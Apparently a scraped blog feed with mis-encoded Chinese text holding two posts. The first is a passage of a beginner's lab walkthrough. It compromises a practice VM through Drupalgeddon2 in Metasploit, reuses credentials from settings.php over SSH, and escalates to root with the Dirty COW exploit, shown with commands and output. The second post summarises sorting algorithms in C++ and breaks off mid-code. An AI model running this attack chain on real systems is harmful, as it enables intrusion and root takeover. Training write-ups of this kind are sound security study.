ç›®ä¸­çš„æ–‡ä»¶ï¼šchangelog.txtï¼ˆè¿™é‡Œä¸ºå¤§å†™ï¼‰æ„æ€ä¸ºæ”¹å˜çš„æ—¥å¿—ï¼ˆæ›´æ–°æ—¥å¿—ï¼‰</p><p>è®¿é—®192.168.204.137:1898/CHANGELOG.txtå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//9.png" alt></p><p>å¾—åˆ°drupalçš„ç‰ˆæœ¬ä¿¡æ¯ï¼š7.54</p><p>ç„¶åå°±å¯ä»¥å»ç½‘ä¸Šæœç´¢ä¸€ä¸‹å…³äºè¯¥ç‰ˆæœ¬çš„æ¼æ´ï¼Œç„¶åé’ˆå¯¹æ¼æ´è¿›è¡Œæ”»å‡»ï¼</p><pre><code>åœ¨ç½‘ä¸Šå¯ä»¥æŸ¥åˆ°Drupal7.54å­˜åœ¨çš„æ¼æ´ï¼šhttps://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=drupalå¯ä»¥åˆ©ç”¨metasploitæ¥é’ˆå¯¹æ­¤ç‰ˆæœ¬çš„Drupalè¿›è¡Œæ”»å‡»ï¼Œè·å¾—shellï¼ˆå’‹çœ‹å‡ºæ¥çš„æˆ‘ä¹Ÿä¸çŸ¥é“ï¼‰ç»è¿‡æŸ¥é˜…å‘ç°msfå¯ä»¥æœç´¢ä¸€ä¸ªæ¡†æ¶çš„æ¼æ´</code></pre><p>å»ºè®®æœç‹—è®¿é—®ï¼ˆå› ä¸ºå¯ä»¥ç¿»è¯‘ï¼Œåˆ«çš„æµè§ˆå™¨æˆ‘æ‰¾ä¸åˆ°åœ¨å“ªé‡Œç¿»è¯‘-_-||ï¼‰ç„¶åç¿»è¯‘åå‘ç°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//10.png" alt></p><p>è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ç®€ç›´æ•°ä¸èƒœæ•°ï¼ˆä½†æ˜¯ç°åœ¨çš„ä¾ç„¶éœ€è¦æ ¹æ®æ•™ç¨‹æ¥æ“ä½œ-_-||ï¼‰</p><h3 id="æ¥ä¸‹æ¥å°±æ˜¯é’ˆå¯¹msfçš„ä½¿ç”¨"><a href="#æ¥ä¸‹æ¥å°±æ˜¯é’ˆå¯¹msfçš„ä½¿ç”¨" class="headerlink" title="æ¥ä¸‹æ¥å°±æ˜¯é’ˆå¯¹msfçš„ä½¿ç”¨"></a>æ¥ä¸‹æ¥å°±æ˜¯é’ˆå¯¹msfçš„ä½¿ç”¨</h3><p>1.</p><pre><code>search drupalæœç´¢å…¶æ¼æ´å¾—åˆ°ï¼š</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//11.png" alt></p><p>2.ä½¿ç”¨Drupal Drupalgeddon 2 Forms API Property Injectionï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰</p><pre><code>use 4set rhost 192.168.204.137set rport 1898show targetsset target 0#æŸ¥çœ‹ä»¥åŠè®¾ç½®ç›®æ ‡æ“ä½œç³»ç»Ÿç±»å‹run #ä¸Šé¢ä¸¤æ­¥æ¨èçš„æ–¹å¼ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥runï¼Œè¿™æ­¥ç»“æŸåä¼šå¾—åˆ°ä¸€ä¸ªä¼šè¯ç”¨æ¥è¿æ¥å¯¹é¢çš„shellshellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; #æ‰§è¡Œshellè·å–äº¤äº’å¼å‘½ä»¤ï¼Œç”±äºæˆ‘ä»¬è·å–çš„shellå¹¶ä¸æ˜¯ä¸€ä¸ªå…·æœ‰å®Œæ•´äº¤äº’çš„shellï¼Œå¯¹äºå·²ç»å®‰è£…äº†pythonçš„ç³»ç»Ÿï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ pythonæä¾›çš„ptyæ¨¡å—ï¼Œåªéœ€è¦ä¸€è¡Œè„šæœ¬å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªåŸç”Ÿçš„ç»ˆç«¯ï¼Œå‘½ä»¤å¦‚ä¸Š</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//12.png" alt></p><p>æ­¤æ—¶è·å–äº†shellç„¶åå¼€å§‹æŸ¥çœ‹å½“ä¸‹ç›®å½•</p><p>åœ¨var/www/html/sites/defaultç›®å½•ä¸‹æ‰¾åˆ°é…ç½®æ–‡ä»¶settings.phpï¼Œå‘ç°æ•æ„Ÿä¿¡æ¯ï¼Œtiagoä»¥åŠå¯†ç ï¼Œå¾ˆæœ‰å¯èƒ½å°±æ˜¯å…¶ç³»ç»Ÿç”¨æˆ·tiagoçš„å¯†ç ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//321.jpg" alt></p><p>æ‰“å¼€192.168.204.137:1898ç«¯å£ï¼Œå‘ç°äº†ä¸€ç¯‡æ–‡ç« çš„æäº¤è€…ï¼Œè¯´æ˜ä»€ä¹ˆï¼è¿™ä¸ªäººå°±å¾ˆæœ‰å¯èƒ½æ˜¯è¿™ä¸ªç½‘ç«™çš„ç®¡ç†å‘˜ï¼Œæˆ–è€…ç³»ç»Ÿç”¨æˆ·æ‰€ä»¥å°±è¯•è¯•å‘—ï¼Œæ¯•ç«Ÿä¿¡æ¯æ”¶é›†ä¹Ÿå°±è¿™ä¹ˆå¤šäº†ã€‚ã€‚</p><p>ç„¶ååˆ©ç”¨sshåè®®è¿›è¡Œè¿œç¨‹ç™»å½•</p><pre><code>ssh tiago@192.168.204.137</code></pre><p>æˆåŠŸè·å–shellï¼</p><p>æœ€é‡è¦ä¸€æ­¥â†“</p><h3 id="è„ç‰›ææƒï¼ï¼"><a href="#è„ç‰›ææƒï¼ï¼" class="headerlink" title="è„ç‰›ææƒï¼ï¼"></a>è„ç‰›ææƒï¼ï¼</h3><pre><code>uname -aæŸ¥çœ‹ä¸€ä¸‹å†…æ ¸ä¿¡æ¯ï¼š2016å¹´çš„è¿™æ˜¯searchsploit dirtyç›´æ¥è„ç‰›çš„æœ¨é©¬å–½ä¸€çœ¼//çœ‹ç½‘ä¸Šè¯´ç”¨è¿™ä¸ªè„šæœ¬ææƒcp /usr/share/exploitdb/exploits/linux/local/40847.cpp ~æ³¨æ„è¿™é‡Œçš„ ~,ä»–å‰é¢çš„æ˜¯è¿™ä¸ªè„šæœ¬çš„æ–‡ä»¶ç›®å½•ï¼Œ~å¯ä»¥æ”¹ä¸º/rootæˆ–è€…/homeåæ­£å°±æ˜¯æä¸»ç›®å½•ä¸‹ï¼Œä¸€ä¸ªlså°±èƒ½çœ‹è§é‚£ç§</code></pre><p>å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52134_1.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52137_2.png" alt></p><p>ç„¶åå†å›åˆ°msfé¡µé¢ctrl+cè¿”å›æ§åˆ¶å° </p><pre><code>meterpreter &gt; upload /root/40847.cpp /tmp/40847.cpp</code></pre><p>æŠŠæˆ‘/rootæ–‡ä»¶ä¸‹çš„ç›®å½•ä¼ åˆ°/tmpç›®å½•ä¸‹</p><pre><code>shell//ç»§ç»­è¿æ¥å›å»python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;//è¿›å…¥TTLç»ˆç«¯</code></pre><p>ç„¶åå›åˆ°/tmpç›®å½•ä¸‹lsæŸ¥çœ‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52227_4.png" alt></p><pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutilè¿›è¡Œç¼–è¯‘è¿™æ˜¯å…³äºå‚æ•°1-Wall ä¸€èˆ¬ä½¿ç”¨è¯¥é€‰é¡¹ï¼Œå…è®¸å‘å‡ºGCCèƒ½å¤Ÿæä¾›çš„æ‰€æœ‰æœ‰ç”¨çš„è­¦å‘Š2-pedantic å…è®¸å‘å‡ºANSI/ISO Cæ ‡å‡†æ‰€åˆ—å‡ºçš„æ‰€æœ‰è­¦å‘Š3-O2ç¼–è¯‘å™¨çš„ä¼˜åŒ–é€‰é¡¹çš„4ä¸ªçº§åˆ«ï¼Œ-O0è¡¨ç¤ºæ²¡æœ‰ä¼˜åŒ–,-O1ä¸ºç¼ºçœå€¼ï¼Œ-O3ä¼˜åŒ–çº§åˆ«æœ€é«˜4-std=c++11å°±æ˜¯ç”¨æŒ‰C++2011æ ‡å‡†æ¥ç¼–è¯‘çš„5-pthread åœ¨Linuxä¸­è¦ç”¨åˆ°å¤šçº¿ç¨‹æ—¶ï¼Œéœ€è¦é“¾æ¥pthreadåº“6-o dcow gccç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶,åå­—ä¸ºdcow./dcow -s#æ‰§è¡Œè¯¥æ–‡ä»¶ ./dcow &gt; status.txtæœ‰åŒæ ·çš„æ•ˆæœ</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52217_3.png" alt></p><p>ç„¶åä¼šå‘ç°è¯¥æ¼æ´åˆ©ç”¨æˆåŠŸï¼Œå·²å°†rootå¯†ç ä¿®æ”¹ï¼</p><pre><code>www-data@lampiao:/tmp$ ./dcow &gt; status.txt./dcow &gt; status.txtRunning ...Received su prompt (Password: )Root password is:   dirtyCowFunEnjoy! :-)www-data@lampiao:/tmp$ su rootsu rootPassword: dirtyCowFunroot@lampiao:/tmp# lsroot@lampiao:/# cd /rootcd /rootroot@lampiao:~# lslsflag.txtroot@lampiao:~# cat flag.txtcat flag.txt9740616875908d91ddcdaa8aea3af366</code></pre><p>èƒ½åšåˆ°æ­¤æ­¥ååˆ†æ„Ÿè°¢ï¼Œååˆ†æ„Ÿè°¢ç½‘ä¸Šå„ä½å¤§ä½¬çš„wp</p><p>æ€»ç»“ï¼š</p><p>å¯¹å„ç§å·¥å…·çš„æŒæ¡ååˆ†fw</p><p>ä¸ä¼šå°±ç™¾åº¦</p><p>å¯¹è„ç‰›ææƒæœ‰äº†å¤§ä½“çš„è®¤è¯†</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥é—¨ </tag>
            
            <tag> é¶æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åå¤§ç»å…¸æ’åºç®—æ³•æ•´ç†æ±‡æ€»ï¼ˆé™„ä»£ç ï¼‰</title>
      <link href="/2020/02/16/sort-algorithms/"/>
      <url>/2020/02/16/sort-algorithms/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>æ¯æ—¥ç®—æ³•å¹²è´§é©¬ä¸Šå°±æ¥ï¼</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/02/16/sort-algorithms/../themes/matery/source/medias/contact.jpg" alt></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡æ•´ç†å¹¶æ€»ç»“äº†åå¤§ç»å…¸çš„æ’åºç®—æ³•ï¼ˆå†’æ³¡æ’åºã€é€‰æ‹©æ’åºã€æ’å…¥æ’åºã€å¿«é€Ÿæ’åºã€å½’å¹¶æ’åºã€å¸Œå°”æ’åºã€è®¡æ•°æ’åºã€åŸºæ•°æ’åºã€æ¡¶æ’åºã€å †æ’åºï¼‰çš„æ—¶é—´å¤æ‚åº¦ã€ç©ºé—´å¤æ‚åº¦ç­‰æ€§è´¨ã€‚</p><p><strong>æœ¬æ–‡å¹¶ä¸ä¼šè¯¦ç»†è®²è§£æ¯ç§æ’åºç®—æ³•çš„åŸç†</strong>ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå¾ˆå¥½çš„æ•™ç¨‹ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å»æœäº†çœ‹ã€‚</p><p>æœ€åæˆ‘è¿˜äº²è‡ªæ‰‹å†™äº†åç§æ’åºç®—æ³•çš„ c++ ä»£ç ï¼Œå¤§å®¶å¯ä»¥ç”¨æ¥é€šè¿‡ <a href="https://leetcode-cn.com/problems/sort-an-array/" title="LeetCode 912. æ’åºæ•°ç»„" target="_blank" rel="noopener">LeetCode 912. æ’åºæ•°ç»„</a> è¿™é“é¢˜ã€‚</p><h2 id="æ€§è´¨æ±‡æ€»"><a href="#æ€§è´¨æ±‡æ€»" class="headerlink" title="æ€§è´¨æ±‡æ€»"></a>æ€§è´¨æ±‡æ€»</h2><blockquote><p>å¦‚æœå‘ç°è¡¨ä¸­æœ‰é”™è¯¯ï¼Œè¯·ç•™è¨€å‘ŠçŸ¥ã€‚</p></blockquote><table><thead><tr><th>ç®—æ³•</th><th>æœ€å¥½</th><th>æœ€å</th><th>å¹³å‡</th><th>ç©ºé—´</th><th align="center">ç¨³å®šæ€§</th><th align="center">æ˜¯å¦åŸºäºæ¯”è¾ƒ</th></tr></thead><tbody><tr><td>å†’æ³¡æ’åº</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>é€‰æ‹©æ’åº</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>æ’å…¥æ’åº</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>å¿«é€Ÿæ’åº</td><td>$O(n\log n)$</td><td>$O(n^2)$</td><td>$O(n\log n)$</td><td>$O(\log n)$~$O(n)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>å½’å¹¶æ’åº</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>å¸Œå°”æ’åº</td><td>$O(n^{1.3})$</td><td>$O(n^2)$</td><td>$O(n\log n)$~$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>è®¡æ•°æ’åº</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>åŸºæ•°æ’åº</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>æ¡¶æ’åº</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n+m)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>å †æ’åº</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr></tbody></table><blockquote><p>å¦‚æœè¡¨æ ¼æ˜¾ç¤ºæœ‰é—®é¢˜çš„è¯ï¼Œè¿˜å¯ä»¥ç›´æ¥çœ‹ä¸‹é¢çš„æ±‡æ€»å›¾ï¼š</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/02/16/sort-algorithms/1.png" alt="åå¤§ç»å…¸æ’åºç®—æ³•æ€§è´¨æ±‡æ€»"></p><h3 id="ç»´åŸºç™¾ç§‘"><a href="#ç»´åŸºç™¾ç§‘" class="headerlink" title="ç»´åŸºç™¾ç§‘"></a>ç»´åŸºç™¾ç§‘</h3><p>æˆ‘è§‰å¾—è¿˜æ˜¯è‹±æ–‡ç»´åŸºç™¾ç§‘è®²çš„æ¯”è¾ƒè¯¦ç»†ã€ä¸¥è°¨ã€‚å¦‚æœå¤§å®¶çœ‹çš„æ¯”è¾ƒç´¯çš„è¯ï¼Œå¯ä»¥è‡ªå·±ç™¾åº¦æœç´¢ç›¸åº”çš„æ•™ç¨‹ã€‚</p><p><strong>å†’æ³¡æ’åº</strong><br><a href="https://en.wikipedia.org/wiki/Bubble_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bubble_sort</a></p><p><strong>é€‰æ‹©æ’åº</strong><br><a href="https://en.wikipedia.org/wiki/Selection_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Selection_sort</a></p><p><strong>æ’å…¥æ’åº</strong><br><a href="https://en.wikipedia.org/wiki/Insertion_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Insertion_sort</a></p><p><strong>å¿«é€Ÿæ’åº</strong><br><a href="https://en.wikipedia.org/wiki/Quicksort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Quicksort</a></p><p><strong>å½’å¹¶æ’åº</strong><br><a href="https://en.wikipedia.org/wiki/Merge_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Merge_sort</a></p><p><strong>å¸Œå°”æ’åº</strong><br><a href="https://en.wikipedia.org/wiki/Shellsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Shellsort</a></p><p><strong>è®¡æ•°æ’åº</strong><br><a href="https://en.wikipedia.org/wiki/Counting_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Counting_sort</a></p><p><strong>åŸºæ•°æ’åº</strong><br><a href="https://en.wikipedia.org/wiki/Radix_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Radix_sort</a></p><p><strong>æ¡¶æ’åº</strong><br><a href="https://en.wikipedia.org/wiki/Bucket_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bucket_sort</a></p><p><strong>å †æ’åº</strong><br><a href="https://en.wikipedia.org/wiki/Heapsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Heapsort</a></p><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><p>æ‰€æœ‰çš„æ’åºç®—æ³•æ¥å£éƒ½æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå°±æ˜¯ <code>vector&lt;int&gt; xxxSort(vector&lt;int&gt;&amp; nums)</code> ã€‚åªéœ€è¦ä½ ä¼ å…¥ä¸€ä¸ª <code>vector&lt;int&gt;</code> ç±»å‹çš„æ•°ç»„ï¼Œå°±èƒ½è¿”å›æ’åºåçš„ç»“æœã€‚</p><p>è¿è¡Œä¸‹æ¥å¯ä»¥å‘ç°ï¼Œæ¡¶æ’åºé€Ÿåº¦æ˜¯æ¯”è¾ƒå¿«çš„ã€‚è€Œå†’æ³¡æ’åºã€é€‰æ‹©æ’åºå’Œæ’å…¥æ’åºå› ä¸ºæ—¶é—´å¤æ‚åº¦å¤ªé«˜æ— æ³•é€šè¿‡æœ¬é¢˜ï¼ŒåŸºæ•°æ’åºå› ä¸ºæ— æ³•å¤„ç†è´Ÿæ•°ä¹Ÿä¸èƒ½é€šè¿‡æœ¬é¢˜ã€‚</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">sortArray</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// å†’æ³¡æ’åºï¼ˆè¶…æ—¶ï¼‰</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token number">-2</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// é€‰æ‹©æ’åºï¼ˆè¶…æ—¶ï¼‰</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">selectSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> idx <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    idx <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// æ’å…¥æ’åºï¼ˆè¶…æ—¶ï¼‰</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">insertSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// å¿«é€Ÿæ’åºï¼ˆ24 msï¼‰</span>    <span class="token keyword">void</span> <span class="token function">qSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">quickSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token 